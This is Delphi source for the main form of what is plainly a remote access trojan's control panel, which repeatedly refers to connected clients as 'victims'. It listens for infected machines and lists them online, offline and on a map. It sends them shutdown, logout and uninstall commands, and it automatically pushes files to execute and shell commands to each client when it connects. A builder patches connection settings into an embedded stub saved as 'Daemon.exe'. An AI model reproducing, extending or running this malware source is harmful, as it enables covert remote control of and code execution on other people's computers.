unit FrmMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.TMSFNCTypes, Vcl.TMSFNCUtils,
  Vcl.TMSFNCGraphics, Vcl.TMSFNCGraphicsTypes, Vcl.TMSFNCMapsCommonTypes,
  Vcl.ExtCtrls, System.ImageList, Vcl.ImgList, acAlphaImageList, Vcl.Menus,
  ncSources, sSkinManager, Vcl.ComCtrls, sStatusBar, Vcl.Buttons, sSpeedButton,
  CnWaterImage, Vcl.TMSFNCCustomControl, Vcl.TMSFNCWebBrowser, Vcl.TMSFNCMaps,
  sComboBox, sTreeView, Vcl.StdCtrls, sCheckBox, Vcl.Mask, sMaskEdit,
  sCustomComboEdit, sComboBoxes, sButton, sEdit, sSpinEdit, sLabel, sGroupBox,
  sListView, sPageControl, sSplitter, FrmAbout, System.NetEncoding, FrmExecute,
  FrmScripting, IdHTTP, IdSSLOpenSSL, IdGlobal, System.JSON, Clipbrd,
  System.IOUtils;

type
  TConnectedUserData = class
    Line: TncLine;
    ID: string;
  end;

type
  TForm1 = class(TForm)
    SkinManager: TsSkinManager;
    MenuBarImages: TsAlphaImageList;
    MenuBar: TMainMenu;
    C9: TMenuItem;
    O2: TMenuItem;
    O3: TMenuItem;
    B1: TMenuItem;
    S1: TMenuItem;
    O1: TMenuItem;
    S2: TMenuItem;
    T1: TMenuItem;
    A1: TMenuItem;
    StatusBar: TsStatusBar;
    EventLogPageControl: TsPageControl;
    EventLogTab: TsTabSheet;
    EventLogList: TsListView;
    UtilityPageControl: TsPageControl;
    Online: TsTabSheet;
    OnlineList: TsListView;
    Offline: TsTabSheet;
    OfflineList: TsListView;
    Settings: TsTabSheet;
    sGroupBox1: TsGroupBox;
    sLabel1: TsLabel;
    sLabel2: TsLabel;
    sSpinEdit1: TsSpinEdit;
    sButton1: TsButton;
    sEdit1: TsEdit;
    sButton2: TsButton;
    sGroupBox2: TsGroupBox;
    BlockList: TsListView;
    sEdit2: TsEdit;
    sGroupBox3: TsGroupBox;
    sSkinSelector1: TsSkinSelector;
    sEdit6: TsEdit;
    sButton5: TsButton;
    Tasks: TsTabSheet;
    sPageControl3: TsPageControl;
    DownExec: TsTabSheet;
    sEdit4: TsEdit;
    sButton3: TsButton;
    ExecCmd: TsTabSheet;
    sEdit5: TsEdit;
    sButton4: TsButton;
    TaskList: TsListView;
    sComboBox1: TsComboBox;
    Map: TsTabSheet;
    TMSFNCMaps1: TTMSFNCMaps;
    sSplitter1: TsSplitter;
    ServerSource: TncServerSource;
    Builder: TsTabSheet;
    sGroupBox4: TsGroupBox;
    sEdit3: TsEdit;
    sSpinEdit2: TsSpinEdit;
    sGroupBox7: TsGroupBox;
    sGroupBox8: TsGroupBox;
    sEdit7: TsEdit;
    AboutImageList: TsCharImageList;
    ClientImages: TsAlphaImageList;
    ClientPopup: TPopupMenu;
    R2: TMenuItem;
    R4: TMenuItem;
    N1: TMenuItem;
    S3: TMenuItem;
    L1: TMenuItem;
    Logout1: TMenuItem;
    S4: TMenuItem;
    H1: TMenuItem;
    N9: TMenuItem;
    MenuItem5: TMenuItem;
    R6: TMenuItem;
    U2: TMenuItem;
    Uninstall1: TMenuItem;
    R1: TMenuItem;
    N5: TMenuItem;
    L2: TMenuItem;
    C2: TMenuItem;
    C8: TMenuItem;
    CopyUsername1: TMenuItem;
    OfflinePopup: TPopupMenu;
    R8: TMenuItem;
    N7: TMenuItem;
    C12: TMenuItem;
    CopyIP1: TMenuItem;
    B2: TMenuItem;
    TaskPopup: TPopupMenu;
    R13: TMenuItem;
    EventLogPopup: TPopupMenu;
    C1: TMenuItem;
    sGroupBox6: TsGroupBox;
    sEdit9: TsEdit;
    sButton6: TsButton;
    sButton7: TsButton;
    sGroupBox9: TsGroupBox;
    sEdit10: TsEdit;
    sGroupBox10: TsGroupBox;
    sEdit11: TsEdit;
    BlockListPopup: TPopupMenu;
    R3: TMenuItem;
    C3: TMenuItem;
    procedure A1Click(Sender: TObject);
    procedure O2Click(Sender: TObject);
    procedure O3Click(Sender: TObject);
    procedure B1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure sButton1Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);
    procedure ServerSourceDisconnected(Sender: TObject; aLine: TncLine);
    function ServerSourceHandleCommand(Sender: TObject; aLine: TncLine;
      aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
      const aSenderComponent, aReceiverComponent: string): TBytes;
    procedure R13Click(Sender: TObject);
    procedure sButton3Click(Sender: TObject);
    procedure sEdit4Click(Sender: TObject);
    procedure sButton4Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure Logout1Click(Sender: TObject);
    procedure S4Click(Sender: TObject);
    procedure H1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure R4Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure U2Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure sButton6Click(Sender: TObject);
    procedure sButton7Click(Sender: TObject);
    procedure sEdit2KeyPress(Sender: TObject; var Key: Char);
    procedure R3Click(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure sButton5Click(Sender: TObject);
    procedure R8Click(Sender: TObject);
    procedure C12Click(Sender: TObject);
    procedure CopyIP1Click(Sender: TObject);
    procedure B2Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure CopyUsername1Click(Sender: TObject);
    procedure C8Click(Sender: TObject);
  private
    { Private declarations }
    ThisFormsVictimID: string;
  public
    { Public declarations }
    ConnectedClients: Integer;
    ConnectedUsers: TStringList;
    VictimsCount: Integer;
    OfflineCount: Integer;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm1.A1Click(Sender: TObject);
begin
  Form2.show;
end;

procedure TForm1.B1Click(Sender: TObject);
begin
  UtilityPageControl.ActivePage := Builder;
end;

procedure TForm1.B2Click(Sender: TObject);
var
  SelectedItem: TListItem;
  FirstItemText: string;
  NewItem: TListItem;
begin

  if OfflineList.Selected <> nil then
  begin
    SelectedItem := OfflineList.Selected;

    FirstItemText := SelectedItem.caption;

    NewItem := BlockList.Items.Add;
    NewItem.caption := FirstItemText;
  end;
end;

procedure TForm1.C12Click(Sender: TObject);
var
  SelectedItem: TListItem;
  FirstItemText: string;
begin
  if OfflineList.Selected <> nil then
  begin
    SelectedItem := OfflineList.Selected;
    FirstItemText := SelectedItem.caption;
    Clipboard.AsText := FirstItemText;
  end;
end;

procedure TForm1.C1Click(Sender: TObject);
begin
  EventLogList.Clear;
end;

procedure TForm1.C2Click(Sender: TObject);
var
  SelectedItem: TListItem;
  FirstItemText: string;
begin
  if OnlineList.Selected <> nil then
  begin
    SelectedItem := OnlineList.Selected;
    FirstItemText := SelectedItem.caption;
    Clipboard.AsText := FirstItemText;
  end;
end;

procedure TForm1.C3Click(Sender: TObject);
begin
  BlockList.Clear;
end;

procedure TForm1.C8Click(Sender: TObject);
var
  SelectedItem: TListItem;
  SecondSubItemText: string;
begin
  if OnlineList.Selected <> nil then
  begin
    SelectedItem := OnlineList.Selected;
    if SelectedItem.SubItems.Count > 0 then
    begin
      SecondSubItemText := SelectedItem.SubItems[1];
      Clipboard.AsText := SecondSubItemText;
    end;
  end;
end;

procedure TForm1.CopyIP1Click(Sender: TObject);
var
  SelectedItem: TListItem;
  SecondSubItemText: string;
begin
  if OfflineList.Selected <> nil then
  begin
    SelectedItem := OfflineList.Selected;
    if SelectedItem.SubItems.Count > 0 then
    begin
      SecondSubItemText := SelectedItem.SubItems[1];
      Clipboard.AsText := SecondSubItemText;
    end;
  end;
end;

procedure TForm1.CopyUsername1Click(Sender: TObject);
var
  SelectedItem: TListItem;
  FirstItemText: string;
  NewItem: TListItem;
begin

  if OnlineList.Selected <> nil then
  begin
    SelectedItem := OnlineList.Selected;

    FirstItemText := SelectedItem.caption;

    NewItem := BlockList.Items.Add;
    NewItem.caption := FirstItemText;
  end;

  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Uninstall|');
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Uninstall|');
  end;
end;

procedure ParseSemicolonDelimited(const Input: string; Output: TStringList);
var
  I, StartPos: Integer;
  Field: string;
  InQuotes: Boolean;
begin
  Output.Clear;
  Field := '';
  InQuotes := False;
  StartPos := 1;

  for I := 1 to Length(Input) do
  begin

    if Input[I] = '"' then
    begin
      InQuotes := not InQuotes;
    end
    else if (Input[I] = ';') and not InQuotes then
    begin
      Output.Add(Field);
      Field := '';
    end
    else
    begin
      Field := Field + Input[I];
    end;
  end;

  if Length(Field) > 0 then
    Output.Add(Field);
end;

procedure LoadOfflineClients;
var
  OfflineFile: TextFile;
  OfflineData: string;
  ListItem: TListItem;
  Parts: TStringList;
  Line: string;
begin
  if not FileExists('Data/Offline.dat') then
    Exit;

  AssignFile(OfflineFile, 'Data/Offline.dat');
  Reset(OfflineFile);

  Parts := TStringList.Create;

  try
    while not Eof(OfflineFile) do
    begin
      ReadLn(OfflineFile, OfflineData);

      Line := OfflineData;

      Parts.Clear;
      ParseSemicolonDelimited(Line, Parts);

      if Parts.Count >= 10 then
      begin
        ListItem := Form1.OfflineList.Items.Add;
        ListItem.caption := Parts[0]; // Client IP
        ListItem.SubItems.Add(Parts[1]); // SubItem 1
        ListItem.SubItems.Add(Parts[2]); // SubItem 2 (Client ID)
        ListItem.SubItems.Add(Parts[3]); // SubItem 3
        ListItem.SubItems.Add(Parts[4]); // SubItem 4
        ListItem.SubItems.Add(Parts[5]); // SubItem 5
        ListItem.SubItems.Add(Parts[6]); // SubItem 6
        ListItem.SubItems.Add(Parts[7]); // SubItem 7
        ListItem.SubItems.Add(Parts[8]); // SubItem 8
        ListItem.SubItems.Add(Parts[9]); // SubItem 9
      end;
    end;
  finally
    CloseFile(OfflineFile);
    Parts.Free;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
var
  FileName: string;
  FileContent: TStringList;
  I, SubItemIndex: Integer;
  InfoLine: string;
  ClientData: TStringList;
  ListItem: TListItem;
begin
  ConnectedUsers := TStringList.Create;
  VictimsCount := 0;
  LoadOfflineClients;
  OfflineCount := OfflineList.Items.Count;
  StatusBar.Panels[2].Text := 'Offline: ' + IntToStr(OfflineCount);
end;

procedure TForm1.H1Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Harbinate|');
  end;
end;

procedure TForm1.L1Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Restart|');
  end;
end;

procedure TForm1.Logout1Click(Sender: TObject);
begin

  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Logout|');
  end;
end;

procedure TForm1.O2Click(Sender: TObject);
begin
  UtilityPageControl.ActivePage := Online;
end;

procedure TForm1.O3Click(Sender: TObject);
begin
  UtilityPageControl.ActivePage := Offline;
end;

procedure TForm1.R13Click(Sender: TObject);
var
  SelectedItem: TListItem;
begin
  if TaskList.Selected <> nil then
  begin
    SelectedItem := TaskList.Selected;
    TaskList.Items.Delete(SelectedItem.Index);
  end
  else
  begin

  end;
end;

procedure TForm1.R1Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Reconnect|');
  end;
end;

procedure TForm1.R2Click(Sender: TObject);
var
  NewForm: TForm4;
  UserData: TConnectedUserData;
  SelectedID: string;
begin
  if OnlineList.Selected = nil then
  begin

    Exit;
  end;

  SelectedID := OnlineList.Selected.SubItems[1];

  UserData := nil;
  for var I := 0 to ConnectedUsers.Count - 1 do
  begin
    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
    begin
      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
      Break;
    end;
  end;

  if UserData = nil then
  begin
    Exit;
  end;

  NewForm := TForm4.Create(nil);
  try
    NewForm.caption := 'Remote Execute | ' + UserData.ID;
    NewForm.ThisFormsVictimID := UserData.ID;
    NewForm.show;
  except
    NewForm.Free;
    raise;
  end;
end;

procedure TForm1.R3Click(Sender: TObject);
begin
  if BlockList.Selected <> nil then
  begin
    BlockList.Items.Delete(BlockList.Selected.Index);
  end
  else
  begin

  end;
end;

procedure TForm1.R4Click(Sender: TObject);
var
  NewForm: TForm3;
  UserData: TConnectedUserData;
  SelectedID: string;
begin
  if OnlineList.Selected = nil then
  begin

    Exit;
  end;

  SelectedID := OnlineList.Selected.SubItems[1];
  UserData := nil;
  for var I := 0 to ConnectedUsers.Count - 1 do
  begin
    if TConnectedUserData(ConnectedUsers.Objects[I]).ID = SelectedID then
    begin
      UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
      Break;
    end;
  end;
  if UserData = nil then
  begin
    Exit;
  end;
  NewForm := TForm3.Create(nil);
  try
    NewForm.caption := 'Remote Scripting | ' + UserData.ID;
    NewForm.ThisFormsVictimID := UserData.ID;
    NewForm.show;
  except
    NewForm.Free;
    raise;
  end;
end;

procedure TForm1.R8Click(Sender: TObject);
begin
  OfflineList.Clear;
  try
    TFile.WriteAllText('Data/Offline.dat', '');
  except
    on E: Exception do
      ShowMessage('Error clearing the file: ' + E.Message);
  end;
end;

procedure TForm1.S1Click(Sender: TObject);
begin
  UtilityPageControl.ActivePage := Settings;
end;

procedure TForm1.S2Click(Sender: TObject);
begin
  UtilityPageControl.ActivePage := Map;
end;

procedure TForm1.S3Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Shutdown|');
  end;
end;

procedure TForm1.S4Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Sleep|');
  end;
end;

procedure TForm1.sButton1Click(Sender: TObject);
var
  ListItem: TListItem;
begin
  if sButton1.caption = 'Start' then
  begin
    ServerSource.Port := sSpinEdit1.value;
    ServerSource.Active := True;
    ListItem := EventLogList.Items.Add;
    ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
    ListItem.SubItems.Add('Started Listening for new connections @' +
      IntToStr(sSpinEdit1.value));
    StatusBar.Panels[0].Text := 'Listening port: ' +
      IntToStr(ServerSource.Port);
    sButton1.caption := 'Stop';
  end
  else
  begin
    ServerSource.Active := False;
    ListItem := EventLogList.Items.Add;
    ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
    ListItem.SubItems.Add('Stopped Listening for new connections @' +
      IntToStr(ServerSource.Port));
    StatusBar.Panels[0].Text := 'Listening port: ';
    sButton1.caption := 'Start';
  end;

end;

procedure TForm1.sButton2Click(Sender: TObject);
var
  ListItem: TListItem;
begin
  ServerSource.EncryptionKey := sEdit1.Text;
  ListItem := EventLogList.Items.Add;
  ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
  ListItem.SubItems.Add('Set encryption key to: ' + sEdit1.Text);

  sEdit7.Text := sEdit1.Text;
end;

procedure TForm1.sButton3Click(Sender: TObject);
var
  ListItem: TListItem;
begin
  ListItem := TaskList.Items.Add;
  ListItem.caption := 'Download&Execute';
  ListItem.SubItems.Add(sEdit4.Text);
end;

procedure TForm1.sButton4Click(Sender: TObject);
var
  ListItem: TListItem;
begin
  ListItem := TaskList.Items.Add;
  ListItem.caption := 'Command&Execute';
  ListItem.SubItems.Add(sEdit5.Text);
end;

procedure TForm1.sButton5Click(Sender: TObject);
begin
  StatusBar.Panels[3].Text := sEdit6.Text;
end;

procedure TForm1.sButton6Click(Sender: TObject);
var
  I, Len: Integer;
  RandomChar: Char;
  RandomString: string;
begin
  Len := 25;
  RandomString := 'SIERRA-';

  for I := 1 to Len do
  begin
    case Random(3) of
      0:
        RandomChar := Chr(Random(26) + Ord('a'));
      1:
        RandomChar := Chr(Random(26) + Ord('A'));
      2:
        RandomChar := Chr(Random(10) + Ord('0'));
    end;

    RandomString := RandomString + RandomChar;
  end;

  sEdit9.Text := RandomString;
end;

procedure TForm1.sButton7Click(Sender: TObject);
var
  ResStream: TResourceStream;
  StubFileName: string;
  SettingText: AnsiString;
  StubHandle, UpdateHandle: THandle;
  ResSize: Cardinal;
  SettingStream: TMemoryStream;
  ResData: Pointer;
  SaveDialog: TSaveDialog;
begin
  SaveDialog := TSaveDialog.Create(nil);
  try
    SaveDialog.Filter := 'Executable Files|*.exe|All Files|*.*';
    SaveDialog.DefaultExt := 'exe';
    SaveDialog.FileName := 'Daemon.exe';
    if SaveDialog.Execute then
    begin
      StubFileName := SaveDialog.FileName;
      ResStream := TResourceStream.Create(HInstance, 'STUB', RT_RCDATA);
      try
        ResStream.Position := 0;
        ResStream.SaveToFile(StubFileName);
      finally
        ResStream.Free;
      end;

      SettingText := AnsiString(Trim(sEdit3.Text) + '|' +
        Trim(IntToStr(sSpinEdit2.value)) + '|' + Trim(sEdit7.Text) + '|' +
        Trim(sEdit9.Text) + '|' + Trim(sEdit10.Text) + '|' +
        Trim(sEdit11.Text));
      StubHandle := BeginUpdateResource(PChar(StubFileName), False);
      if StubHandle <> 0 then
      begin
        try
          SettingStream := TMemoryStream.Create;
          try
            SettingStream.WriteBuffer(SettingText[1], Length(SettingText));
            SettingStream.Position := 0;
            ResSize := SettingStream.Size;
            ResData := SettingStream.Memory;
            if UpdateResource(StubHandle, RT_RCDATA, 'Settings', LANG_NEUTRAL,
              ResData, ResSize) then
              ShowMessage
                ('Built successfully, check the location you selected.');

          finally
            SettingStream.Free;
          end;
        finally
          // End resource update
          EndUpdateResource(StubHandle, False);
        end;
      end
      else
        ShowMessage('Failed to open stub file for embedding.');
    end
    else
    begin
      ShowMessage('File save operation cancelled.');
    end;
  finally
    SaveDialog.Free;
  end;
end;

procedure TForm1.sEdit2KeyPress(Sender: TObject; var Key: Char);
var
  ListItem: TListItem;
begin
  if Key = #13 then
  begin
    ListItem := EventLogList.Items.Add;
    ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
    ListItem.SubItems.Add('Added IP to block list @' + sEdit2.Text);
    BlockList.Items.Add.caption := sEdit2.Text;
    sEdit2.Clear;
    Key := #0;
  end;
end;

procedure TForm1.sEdit4Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
begin
  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.InitialDir := 'C:\Users\Public\Desktop';
    OpenDialog.Filter := 'All Files|*.*';
    if OpenDialog.Execute then
    begin
      sEdit4.Text := OpenDialog.FileName;
    end;
  finally
    OpenDialog.Free;
  end;
end;

procedure MoveClientToOfflineList(const ClientID: string);
var
  I: Integer;
  ListItem: TListItem;
  OfflineFile: TextFile;
  OfflineData, Line: string;
  DataExists: Boolean;
begin
  if not DirectoryExists('Data') then
    CreateDir('Data');

  for I := Form1.OnlineList.Items.Count - 1 downto 0 do
  begin
    if Form1.OnlineList.Items[I].SubItems[1] = ClientID then
    begin
      ListItem := Form1.OfflineList.Items.Add;
      ListItem.caption := Form1.OnlineList.Items[I].caption;
      ListItem.SubItems.AddStrings(Form1.OnlineList.Items[I].SubItems);

      if ListItem.SubItems.Count >= 3 then
      begin
        ListItem.SubItems[2] := 'Offline';
      end;

      // Prepare the OfflineData string
      OfflineData := Form1.OfflineList.Items[I].caption + ';' +
        Form1.OnlineList.Items[I].SubItems[0] + ';' + // SubItem 1
        Form1.OnlineList.Items[I].SubItems[1] + ';' + // SubItem 2 (Client ID)
        Form1.OnlineList.Items[I].SubItems[2] + ';' + // SubItem 3 (Offline)
        Form1.OnlineList.Items[I].SubItems[3] + ';' + // SubItem 4
        Form1.OnlineList.Items[I].SubItems[4] + ';' + // SubItem 5
        Form1.OnlineList.Items[I].SubItems[5] + ';' + // SubItem 6
        Form1.OnlineList.Items[I].SubItems[6] + ';' + // SubItem 7
        Form1.OnlineList.Items[I].SubItems[7] + ';' + // SubItem 8
        Form1.OnlineList.Items[I].SubItems[8] + ';'; // SubItem 9
      DataExists := False;
      if FileExists('Data/Offline.dat') then
      begin
        AssignFile(OfflineFile, 'Data/Offline.dat');
        Reset(OfflineFile);

        while not Eof(OfflineFile) do
        begin
          ReadLn(OfflineFile, Line);
          if Line = OfflineData then
          begin
            DataExists := True;
            Break;
          end;
        end;

        CloseFile(OfflineFile);
      end;

      if not DataExists then
      begin
        AssignFile(OfflineFile, 'Data/Offline.dat');
        if FileExists('Data/Offline.dat') then
          Append(OfflineFile)
        else
          Rewrite(OfflineFile);

        Writeln(OfflineFile, OfflineData);
        CloseFile(OfflineFile);
      end;

      Form1.OnlineList.Items.Delete(I);
      Break;
    end;
  end;
end;

procedure TForm1.ServerSourceDisconnected(Sender: TObject; aLine: TncLine);
var
  I: Integer;
  UserData: TConnectedUserData;
  ClientID: string;
  ListItem: TListItem;
  FileName: string;
  OfflineFile: TextFile;
  FileContent: TStringList;
  ItemExists: Boolean;
  InfoLine: string;
begin
  ClientID := '';
  for I := ConnectedUsers.Count - 1 downto 0 do
  begin
    UserData := TConnectedUserData(ConnectedUsers.Objects[I]);
    if UserData.Line = aLine then
    begin
      ClientID := UserData.ID;
      UserData.Free;
      ConnectedUsers.Delete(I);
      Break;
    end;
  end;

  if ClientID <> '' then
  begin
    TThread.Queue(nil,
      procedure
      begin
        MoveClientToOfflineList(ClientID);
      end);
    ListItem := EventLogList.Items.Add;
    ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
    ListItem.SubItems.Add('Client has disconnected @' + aLine.PeerIP);
  end;
  VictimsCount := OnlineList.Items.Count;
  StatusBar.Panels[1].Text := 'Online: ' + IntToStr(VictimsCount);
  OfflineCount := OfflineList.Items.Count;
  StatusBar.Panels[2].Text := 'Offline: ' + IntToStr(OfflineCount);
end;

function TForm1.ServerSourceHandleCommand(Sender: TObject; aLine: TncLine;
aCmd: Integer; const aData: TBytes; aRequiresResult: Boolean;
const aSenderComponent, aReceiverComponent: string): TBytes;
var
  UserData: TConnectedUserData;
  sl: TStringList;
  li: TListItem;
  ListItem: TListItem;
  VictimID: string;
  Reconnected: Boolean;
  ExistingItem: TListItem;
  MemoryStream: TBytesStream;
  ImageBytes: TBytes;
  StreamData: TBytes;
  Base64String, DataStr: string;
  params: TStringStream;
begin
  sl := TStringList.Create;
  sl.Delimiter := '|';
  sl.StrictDelimiter := True;
  sl.DelimitedText := stringof(aData);

  if sl[0] = 'NewCon' then
  begin
    TThread.Queue(nil,
      procedure
      var
        I: Integer;
        ListItem: TListItem;
        li: TListItem;
        UserData: TConnectedUserData;
        Reconnected: Boolean;
        SubItemText: String;
        FilePath: string;
        bytestream: TBytesStream;
        FileStream: TFileStream;
        DataString: string;
        FileExtension: string;
        Command: string;
      begin

        Reconnected := False;
        for I := OfflineList.Items.Count - 1 downto 0 do
        begin
          if OfflineList.Items[I].SubItems[1] = sl[2] then
          begin
            OfflineList.Items.Delete(I);
            Reconnected := True;
            Break;
          end;
        end;

        UserData := TConnectedUserData.Create;
        UserData.Line := aLine;
        UserData.ID := sl[2];
        ConnectedUsers.AddObject(sl[2], UserData);

        for I := 0 to BlockList.Items.Count - 1 do
        begin

          if BlockList.Items[I].caption = aLine.PeerIP then
          begin
            ListItem := EventLogList.Items.Add;
            ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
            ListItem.SubItems.Add('Blocked IP tried to connect @' +
              aLine.PeerIP);
            SendToSelectedClient(UserData.ID, 'Uninstall|');
            SendToSelectedClient(UserData.ID, 'Uninstall|');
            Break;
          end;
        end;

        ListItem := EventLogList.Items.Add;
        ListItem.caption := FormatDateTime('dd/mm/yy hh:nn:ss', Now);
        if Reconnected then
          ListItem.SubItems.Add('Client has reconnected @' + aLine.PeerIP)
        else
          ListItem.SubItems.Add('New client has connected @' + aLine.PeerIP);

        li := OnlineList.Items.Add;
        li.caption := aLine.PeerIP;
        li.SubItems.Add(sl[1]);
        li.SubItems.Add(sl[2]);
        li.SubItems.Add(sl[3]);
        li.SubItems.Add(sl[4]);
        li.SubItems.Add(sl[5]);
        li.SubItems.Add(sl[6]);
        li.SubItems.Add(sl[7]);
        li.SubItems.Add(sl[8]);
        li.SubItems.Add(sl[9]);

        FlashWindow(application.MainFormHandle, True);

        // Tasks
        If Reconnected then
        begin
          if sComboBox1.ItemIndex = 1 then
          begin
            for I := 0 to TaskList.Items.Count - 1 do
            begin

              if TaskList.Items[I].caption = 'Download&Execute' then
              begin

                if TaskList.Items[I].SubItems.Count > 0 then
                begin
                  SubItemText := TaskList.Items[I].SubItems[0];
                  FilePath := SubItemText;

                  if FilePath = '' then
                  begin

                    Exit;
                  end;

                  if not FileExists(FilePath) then
                  begin

                    Exit;
                  end;

                  FileExtension := ExtractFileExt(FilePath);
                  if FileExtension = '' then
                  begin

                    Exit;
                  end;

                  FileStream := TFileStream.Create(FilePath, fmOpenRead);
                  try
                    bytestream := TBytesStream.Create;
                    try
                      bytestream.CopyFrom(FileStream, FileStream.Size);
                      DataString := TNetEncoding.Base64.EncodeBytesToString
                        (bytestream.Bytes);

                      SendToSelectedClient(UserData.ID,
                        'RemoteExecuteDisk|' + DataString + '|' +
                        FileExtension);

                    finally
                      bytestream.Free;
                    end;
                  finally
                    FileStream.Free;
                  end
                end
                else
                begin

                end;
                Exit;
              end
              else if TaskList.Items[I].caption = 'Command&Execute' then
              begin
                SubItemText := TaskList.Items[I].SubItems[0];
                Command := SubItemText;
                if Command = '' then
                begin

                  Exit;
                end;

                SendToSelectedClient(UserData.ID, 'CommandExecute|' + Command);
              end;
            end;
          end;
        end
        else
        begin

          for I := 0 to TaskList.Items.Count - 1 do
          begin

            if TaskList.Items[I].caption = 'Download&Execute' then
            begin

              if TaskList.Items[I].SubItems.Count > 0 then
              begin
                SubItemText := TaskList.Items[I].SubItems[0];
                FilePath := SubItemText;

                if FilePath = '' then
                begin

                  Exit;
                end;

                if not FileExists(FilePath) then
                begin

                  Exit;
                end;

                FileExtension := ExtractFileExt(FilePath);
                if FileExtension = '' then
                begin

                  Exit;
                end;

                FileStream := TFileStream.Create(FilePath, fmOpenRead);
                try
                  bytestream := TBytesStream.Create;
                  try
                    bytestream.CopyFrom(FileStream, FileStream.Size);
                    DataString := TNetEncoding.Base64.EncodeBytesToString
                      (bytestream.Bytes);

                    SendToSelectedClient(UserData.ID, 'RemoteExecuteDisk|' +
                      DataString + '|' + FileExtension);

                  finally
                    bytestream.Free;
                  end;
                finally
                  FileStream.Free;
                end
              end;
            end
            else if TaskList.Items[I].caption = 'Command&Execute' then
            begin
              SubItemText := TaskList.Items[I].SubItems[0];
              Command := SubItemText;
              if Command = '' then
              begin

                Exit;
              end;

              SendToSelectedClient(UserData.ID, 'CommandExecute|' + Command);
            end;
          end;
        end;

        VictimsCount := Self.OnlineList.Items.Count;
        StatusBar.Panels[1].Text := 'Online: ' + IntToStr(Self.VictimsCount);
        VictimsCount := Self.OfflineList.Items.Count;
        StatusBar.Panels[2].Text := 'Offline: ' + IntToStr(Self.VictimsCount);
      end);
    Exit;
  end;

  if sl[0] = 'Location' then
  begin
    TThread.Queue(nil,
      procedure
      begin
        Self.TMSFNCMaps1.BeginUpdate;
        try
          var
          Lat := StrToFloat(sl[1]);
          var
          Lon := StrToFloat(sl[2]);
          Self.TMSFNCMaps1.AddMarker(Lat, Lon, VictimID);
        finally
          Self.TMSFNCMaps1.EndUpdate;
        end;
      end);
    Exit;
  end;

end;

procedure TForm1.T1Click(Sender: TObject);
begin
  UtilityPageControl.ActivePage := Tasks;
end;

procedure TForm1.U2Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Uninstall|');
  end;
end;

procedure TForm1.Uninstall1Click(Sender: TObject);
begin
  if OnlineList.Selected <> nil then
  begin
    // send to the selected victim on the listview...
    SendToSelectedClient(OnlineList.Selected.SubItems[1], 'Halt|');
  end;
end;

end.
